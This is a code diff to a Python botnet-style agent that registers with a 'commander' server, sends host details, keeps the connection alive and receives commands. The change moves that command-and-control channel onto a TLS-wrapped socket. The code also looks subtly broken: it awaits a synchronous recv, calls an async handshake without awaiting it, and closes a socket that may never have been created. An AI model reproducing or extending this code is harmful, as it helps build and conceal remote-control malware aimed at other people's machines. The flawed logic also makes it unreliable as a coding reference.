@@ -1,5 +1,6 @@
 import os
 import sys
+import ssl
 import uuid
 import json
 import time
@@ -72,6 +73,7 @@ class BotAgent:
         self.conn_buff = conn_buff
         self.hello_freq = hello_freq
         self.sock = socket(AF_INET, SOCK_STREAM)
+        self.context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
         self.reconnect_count = 0
 
     def __config_logger(self):
@@ -119,12 +121,23 @@ class BotAgent:
             self.sock.close()
             self.sock = socket(AF_INET, SOCK_STREAM)
             self.sock.connect((self.host, self.port))
-            self.last_online = time.time()
         except Exception as err:
             self.logger.error(f"Unexpected error occurred when connecting to commander: {err}")
             self.sock.close()
             await self.__reconnect()
+        self.logger.info(f"TCP connection established with commander {self.host}:{self.port}")
         self.reconnect_count = 0
+    
+    async def __tls_handshake(self):
+        self.logger.debug(f"Performing TLS handshake with peer {self.host}:{self.port}")
+        try:
+            self.ssl_sock = self.context.wrap_socket(self.sock)
+            self.last_online = time.time()
+        except Exception as err:
+            self.logger.error(f"Unexpected exception occurred when performing handshake with peer {self.host}:{self.port} - {err}")
+            self.logger.info(f"Closing connection with peer {self.host}:{self.port}")
+            self.ssl_sock.close()
+            self.__tcp_handshake()
 
     async def __reconnect(self):
         if self.reconnect_count < self.max_reconn:
@@ -133,12 +146,10 @@ class BotAgent:
         self.sock = socket(AF_INET, SOCK_STREAM)
         await self.__tcp_handshake()
 
-    def __tls_handshake(self):
-        pass
-
     async def __self_identify(self):
         await self.__tcp_handshake()
-        self.sock.settimeout(self.recv_tout)
+        await self.__tls_handshake()
+        self.ssl_sock.settimeout(self.recv_tout)
         if await self.__send_agent_info():
             self.logger.info(f"Bot-agent {self.hostname}-{self.uuid} has been successfully added by commander")
             await self.__check_for_commands()
@@ -154,12 +165,12 @@ class BotAgent:
             await self.__self_identify()
         try:
             self.logger.debug(f"Sending botHostInfo from bot-agent {self.hostname} to commander")
-            self.sock.sendall(payload)
+            self.ssl_sock.sendall(payload)
         except Exception as err:
             self.logger.error(f"Unexpected error occurred while sending botHostInfo of peer {self.hostname} to commander: {err}")
             return
         try:
-            data = self.sock.recv(self.conn_buff)
+            data = self.ssl_sock.recv(self.conn_buff)
         except Exception as err:
             self.logger.error(f"Unexpected error occurred while reading botHostInfoReply by peer {self.hostname}: {err}")
             return
@@ -169,8 +180,7 @@ class BotAgent:
             else:
                 return
         else:
-            self.logger.warning("Received EOF or empty response by peer {}-{} from commander instead of botHostInfoReply".
-                  format(self.hostname, self.uuid))
+            self.logger.warning(f"Received EOF from commander instead of botHostInfoReply")
             return
 
     async def __process_input_stream(self, data):
@@ -250,7 +260,7 @@ class BotAgent:
                 else:
                     await self.__self_identify()
             try:
-                data = self.__read_buffer()
+                data = await self.__read_buffer()
             except Exception as err:
                 self.logger.error(f"Unexpected error on bot-agent {self.hostname} when reading input stream from"
                                   f" commander, error: {err}")
@@ -314,8 +324,8 @@ class BotAgent:
 
     def __send_command(self, payload, json_msg):
         try:
-            self.logger.debug(f"Sending {payload.decode('utf-8')} from bot-agent {self.hostname}:{self.sock.getsockname()}")
-            self.sock.sendall(payload)
+            self.logger.debug(f"Sending {payload.decode('utf-8')} from bot-agent {self.hostname}:{self.ssl_sock.getsockname()}")
+            self.ssl_sock.sendall(payload)
             self.last_online = time.time()
             return True
         except Exception as err:
@@ -342,7 +352,7 @@ class BotAgent:
         if payload:
             try:
                 self.logger.debug("Sending botHello to Commander to maintain keepalive")
-                self.sock.sendall(payload)
+                self.ssl_sock.sendall(payload)
                 self.last_online = time.time()
             except Exception as err:
                 self.logger.error("Unexpected exception occurred for bot-agent {} when sending botHello to commander: {}".
@@ -353,7 +363,7 @@ class BotAgent:
             return
         return True
 
-    def __read_buffer(self):
+    async def __read_buffer(self):
         buffer = self.__read_initial()
         if not buffer:
             self.logger.debug(f"Buffer of bot-agent {self.hostname} is empty")
@@ -366,7 +376,7 @@ class BotAgent:
                 data_list.append(line)
                 return data_list
             else:
-                more_data = self.sock.recv(self.conn_buff)
+                more_data = await self.ssl_sock.recv(self.conn_buff)
                 if not more_data:
                     buffering = False
                 else:
@@ -374,11 +384,11 @@ class BotAgent:
         return data_list
 
     def __read_initial(self):
-        self.sock.settimeout(self.recv_tout)
+        self.ssl_sock.settimeout(self.recv_tout)
         try:
-            buffer = self.sock.recv(self.conn_buff)
+            buffer = self.ssl_sock.recv(self.conn_buff)
         except TimeoutError:
-            self.logger.warning("Timeout of {} seconds exceeded. Bot-agent {} has not received input stream from commander".
+            self.logger.info("Timeout of {} seconds exceeded. Bot-agent {} has not received input stream from commander".
                   format(self.recv_tout, self.hostname))
             return False
         except Exception as err:
